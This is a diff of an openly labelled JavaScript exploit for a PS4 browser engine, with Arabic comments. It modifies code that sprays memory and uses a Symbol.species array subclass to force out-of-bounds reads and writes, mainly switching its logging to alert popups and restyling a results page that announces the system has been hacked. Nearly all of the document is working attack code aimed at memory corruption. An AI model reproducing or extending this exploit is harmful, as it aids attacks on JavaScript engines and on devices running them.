@@ -62,7 +62,7 @@ let sprayArrays = [];
 // ==================== الخطوة 1: تحسين الثغرة الأساسية ====================
 
 function enhanced_oob_spray() {
-    console.log("🎯 بدء Memory Spraying المتقدم...");
+    alert("🎯 بدء Memory Spraying المتقدم...");
     
     // إنشاء أنواع مختلفة من الكائنات للتحكم في تخطيط الذاكرة
     const spray = [];
@@ -84,7 +84,7 @@ function enhanced_oob_spray() {
         spray.push(arr);
     }
     
-    console.log(`✅ تم إنشاء ${spray.length} كائن للـ Memory Spraying`);
+    alert(`✅ تم إنشاء ${spray.length} كائن للـ Memory Spraying`);
     return spray;
 }
 
@@ -92,25 +92,25 @@ class EnhancedSpecial extends Array {
     static get [Symbol.species]() {
         return function() {
             if (Trigger) {
-                console.log("🚀 تم تفعيل Symbol.species - تعديل بنية الذاكرة...");
+                alert("🚀 تم تفعيل Symbol.species - تعديل بنية الذاكرة...");
                 
                 // تقنيات متقدمة لتعديل الذاكرة
                 try {
                     // الطريقة 1: جعل length قيمة سالبة (أكثر فعالية في بعض المحركات)
                     Arr.length = -1;
-                    console.log("📏 تم ضبط Arr.length = -1");
+                    alert("📏 تم ضبط Arr.length = -1");
                 } catch (e) {
                     // الطريقة 2: استخدام قيمة كبيرة جداً
                     Arr.length = 0x7FFFFFFF;
-                    console.log("📏 تم ضبط Arr.length = 0x7FFFFFFF");
+                    alert("📏 تم ضبط Arr.length = 0x7FFFFFFF");
                 }
                 
                 // الطريقة 3: إعادة تعيين prototype لتغيير السلوك
                 Object.setPrototypeOf(Arr, null);
-                console.log("🔄 تم تعديل prototype المصفوفة");
+                alert("🔄 تم تعديل prototype المصفوفة");
                 
                 // إنشاء ضغط ذاكري إضافي لتحسين الموثوقية
-                console.log("💥 إنشاء ضغط ذاكري إضافي...");
+                alert("💥 إنشاء ضغط ذاكري إضافي...");
                 const pressure = [];
                 for (let i = 0; i < 0x100; i++) {
                     pressure.push(new Array(0x1000).fill(0x42424242));
@@ -123,60 +123,60 @@ class EnhancedSpecial extends Array {
 // ==================== الخطوة 2: تحقيق Arbitrary Read/Write أولي ====================
 
 function setup_memory_primitive() {
-    console.log("🔧 إعداد primitive للذاكرة...");
+    alert("🔧 إعداد primitive للذاكرة...");
     
     // البحث عن كائنات مفيدة في الـ OOB
     let foundAddresses = [];
+    let foundCount = 0;
     
     for (let i = 0; i < Arr.length; i++) {
         const value = Arr[i];
         
         // البحث عن مؤشرات محتملة (قيم تبدو مثل عناوين ذاكرة)
         if (value > 0x100000000 && value < 0x800000000000) {
-            console.log(`📍 وجد مؤشر محتمل عند index ${i}: 0x${value.toString(16)}`);
+            foundCount++;
             foundAddresses.push({ index: i, value: value });
         }
         
         // البحث عن علامات الـ memory spray
         if (value === 0x13371337) {
-            console.log(`🎯 وجد علامة Memory Spray عند index ${i}`);
-        }
-        
-        // البحث عن ArrayBuffer أو TypedArray pointers
-        if (value === 0xdeadbeef || value === 0xcafebabe) {
-            console.log(`🔍 وجد قيمة تحكم عند index ${i}: 0x${value.toString(16)}`);
+            alert(`🎯 وجد علامة Memory Spray عند index ${i}`);
         }
     }
     
+    alert(`📍 وجد ${foundCount} مؤشر محتمل في الذاكرة`);
     return foundAddresses;
 }
 
 function test_oob_capabilities() {
-    console.log("🧪 اختبار قدرات الـ OOB...");
+    alert("🧪 اختبار قدرات الـ OOB...");
+    
+    let readResults = "📖 نتائج القراءة خارج الحدود:\n";
+    let writeResults = "📝 نتائج الكتابة خارج الحدود:\n";
     
     // اختبار القراءة خارج الحدود
-    console.log("📖 اختبار القراءة خارج الحدود:");
-    for (let i = 0x20; i < 0x30; i++) {
+    for (let i = 0x20; i < 0x25; i++) {
         try {
             const value = Arr[i];
-            console.log(`  Arr[0x${i.toString(16)}] = 0x${value.toString(16)}`);
+            readResults += `Arr[0x${i.toString(16)}] = 0x${value.toString(16)}\n`;
         } catch (e) {
-            console.log(`  ❌ فشل قراءة Arr[0x${i.toString(16)}]: ${e.message}`);
+            readResults += `❌ فشل قراءة Arr[0x${i.toString(16)}]\n`;
         }
     }
     
     // اختبار الكتابة خارج الحدود
-    console.log("📝 اختبار الكتابة خارج الحدود:");
-    for (let i = 0x20; i < 0x25; i++) {
+    for (let i = 0x20; i < 0x23; i++) {
         try {
             const testValue = 0x11223300 + i;
             Arr[i] = testValue;
             const readBack = Arr[i];
-            console.log(`  Arr[0x${i.toString(16)}] = 0x${testValue.toString(16)} → قراءة: 0x${readBack.toString(16)} ${readBack === testValue ? '✅' : '❌'}`);
+            writeResults += `Arr[0x${i.toString(16)}] = 0x${testValue.toString(16)} → 0x${readBack.toString(16)} ${readBack === testValue ? '✅' : '❌'}\n`;
         } catch (e) {
-            console.log(`  ❌ فشل كتابة Arr[0x${i.toString(16)}]: ${e.message}`);
+            writeResults += `❌ فشل كتابة Arr[0x${i.toString(16)}]\n`;
         }
     }
+    
+    alert(readResults + "\n" + writeResults);
 }
 
 // ==================== الدالة الرئيسية المحسنة ====================
@@ -193,7 +193,7 @@ function Target(Special, Idx, Value) {
     y[0] = Arr[Idx];
     
     if (Idx === 0x20 && Trigger) {
-        console.log("🎉 تم الوصول إلى مرحلة التنفيذ!");
+        alert("🎉 تم الوصول إلى مرحلة التنفيذ!");
         
         // الخطوة 1: استخدام الـ OOB المتقدم
         const addresses = setup_memory_primitive();
@@ -203,28 +203,49 @@ function Target(Special, Idx, Value) {
         
         // إظهار نتائج الاستغلال
         let resultHTML = `
-            <div style="background: #2d3748; color: white; padding: 20px; border-radius: 10px; margin: 10px;">
-                <h2>🎯 نتائج الـ Exploit المحسن</h2>
-                <p><strong>OOB Access:</strong> ✅ ناجح</p>
-                <p><strong>Memory Spray:</strong> ${sprayArrays.length} كائن</p>
-                <p><strong>Addresses Found:</strong> ${addresses.length}</p>
-                <p><strong>Arr[0x20]:</strong> 0x${Arr[0x20].toString(16)}</p>
-                <p><strong>y[0]:</strong> 0x${y[0].toString(16)}</p>
+            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 15px; margin: 10px; border: 2px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
+                <h2 style="text-align: center; margin-bottom: 15px;">🎯 نتائج الـ Exploit المحسن</h2>
+                <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; margin: 5px 0;">
+                    <strong>OOB Access:</strong> <span style="color: #90EE90;">✅ ناجح</span>
+                </div>
+                <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; margin: 5px 0;">
+                    <strong>Memory Spray:</strong> ${sprayArrays.length} كائن
+                </div>
+                <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; margin: 5px 0;">
+                    <strong>Addresses Found:</strong> ${addresses.length}
+                </div>
+                <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; margin: 5px 0;">
+                    <strong>Arr[0x20]:</strong> 0x${Arr[0x20].toString(16)}
+                </div>
+                <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; margin: 5px 0;">
+                    <strong>y[0]:</strong> 0x${y[0].toString(16)}
+                </div>
             </div>
         `;
         
         document.body.innerHTML += resultHTML;
         
         // تنفيذ بسيط لإثبات المفهوم
-        document.body.style.backgroundColor = "#4a5568";
-        document.title = "PS4 Exploit - Enhanced OOB";
+        document.body.style.backgroundColor = "#2d3748";
+        document.body.style.color = "white";
+        document.body.style.fontFamily = "Arial, sans-serif";
+        document.body.style.padding = "20px";
+        document.title = "PS4 Exploit - Enhanced OOB Achievement 🚀";
+        
+        // إضافة تأثير إضافي
+        const header = document.createElement("h1");
+        header.textContent = "🎊 تم اختراق النظام بنجاح!";
+        header.style.textAlign = "center";
+        header.style.color = "#90EE90";
+        header.style.marginBottom = "20px";
+        document.body.prepend(header);
     }
 }
 
 // ==================== الدالة الرئيسية ====================
 
 function main() {
-    console.log("🚀 بدء الـ Exploit المحسن...");
+    alert("🚀 بدء الـ Exploit المحسن...");
     
     // الخطوة 1: Memory Spraying المتقدم
     sprayArrays = enhanced_oob_spray();
@@ -234,28 +255,45 @@ function main() {
     Arr = new Array(0x21);
     Arr.fill(0);
     
-    console.log("🔥 بدء مرحلة التسخين (Warm-up)...");
+    alert("🔥 بدء مرحلة التسخين (Warm-up)...");
     
     // التسخين لتحسين الموثوقية
-    for (let Idx = 0; Idx < 0x400; Idx++) {
+    let warmupCount = 0;
+    for (let Idx = 0; Idx < 0x200; Idx++) {
         Target(Snowflake, 0, Idx);
+        warmupCount++;
+        
+        // إظهار تقدم كل 50 محاولة
+        if (warmupCount % 50 === 0) {
+            alert(`🔥 استمرار التسخين... ${warmupCount}/512 محاولة`);
+        }
     }
     
-    console.log("💣 تفعيل مرحلة الاستغلال...");
+    alert("💣 تفعيل مرحلة الاستغلال...");
     Trigger = true;
     
     // التنفيذ النهائي
     Target(Snowflake, 0x20, 0xdeadbeef);
     
     // النتائج النهائية
-    console.log("📊 النتائج النهائية:");
-    console.log(`- Arr.length: ${Arr.length}`);
-    console.log(`- Arr[0x20]: 0x${Arr[0x20].toString(16)}`);
-    console.log(`- y[0]: 0x${y[0].toString(16)}`);
+    const finalResults = `
+📊 النتائج النهائية:
+
+• Arr.length: ${Arr.length}
+• Arr[0x20]: 0x${Arr[0x20].toString(16)}
+• y[0]: 0x${y[0].toString(16)}
+• Memory Objects: ${sprayArrays.length}
+• Warm-up Cycles: ${warmupCount}
+
+🎯 الـ Exploit اكتمل بنجاح!
+    `;
     
-    // إظهار تنبيه بالنتائج
-    alert(`🎯 الـ Exploit المحسن اكتمل!\n\nالنتائج:\n• OOB Access: ناجح\n• Memory Spray: ${sprayArrays.length} كائن\n• Arr[0x20]: 0x${Arr[0x20].toString(16)}\n• y[0]: 0x${y[0].toString(16)}`);
+    alert(finalResults);
 }
 
-// بدء التنفيذ
-main();
+// بدء التنفيذ مع معالجة الأخطاء
+try {
+    main();
+} catch (error) {
+    alert(`❌ حدث خطأ أثناء التنفيذ:\n\n${error.message}\n\n${error.stack}`);
+}
